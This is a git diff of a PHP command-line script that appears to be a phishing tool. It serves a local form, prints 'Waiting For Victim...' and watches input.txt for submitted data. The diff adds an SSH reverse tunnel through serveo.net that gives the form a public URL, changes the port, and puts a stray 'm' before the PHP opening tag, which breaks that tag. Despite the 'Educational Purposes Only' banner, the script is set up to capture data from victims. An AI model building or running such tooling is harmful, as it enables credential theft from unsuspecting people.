@@ -1,4 +1,4 @@
-<?php
+m<?php
 // Initialize script
 system(PHP_OS_FAMILY == "Windows" ? "cls" : "clear");
 
@@ -15,7 +15,7 @@ echo "\033[31mNote: For Educational Purposes Only\n\033[0m";
 
 // Start PHP's built-in server to host the form locally
 $host = "localhost";
-$port = "8000";
+$port = "2000";
 
 // Capture the start time in milliseconds
 $start_time = microtime(true);
@@ -47,14 +47,39 @@ if (!file_exists($form_file)) {
   die("Error: The index.php file is missing. Please create the form file.\n");
 }
 
-// Start listening for changes in the input file
-$file = "input.txt";
+// Start the SSH tunnel using Serveo
+echo "\033[32mEstablishing SSH tunnel...\033[0m\n";
+$ssh_command = "ssh -R 80:localhost:$port serveo.net > ssh_output.txt 2>&1 &";
+exec($ssh_command);
 
+// Read the URL from SSH output after Serveo starts
+$ssh_output_file = "ssh_output.txt";
+
+// Wait for the SSH tunnel to establish and output the URL
+$tunnel_url = null;
+while ($tunnel_url === null) {
+    if (file_exists($ssh_output_file)) {
+        $lines = file($ssh_output_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        foreach ($lines as $line) {
+            if (strpos($line, 'http') !== false) {
+                $tunnel_url = $line;
+                echo "\033[32mTunnel URL: $tunnel_url\033[0m\n";
+                break;
+            }
+        }
+    }
+    sleep(1); // Wait for SSH output to be written
+}
+
+// Start listening for input in the input.txt file
+$file = "input.txt";
 echo "\e[33mWaiting For Victim...\n\e[0m";
-echo "\e[34mClick Control C to Stop\e[0m" . "\n";
+echo "\e[34mClick Control C to Stop\e[0m\n";
 
 while (true) {
   clearstatcache();
+
+  // Check if input.txt exists and read its content
   if (file_exists($file)) {
     $input = file_get_contents($file);
 
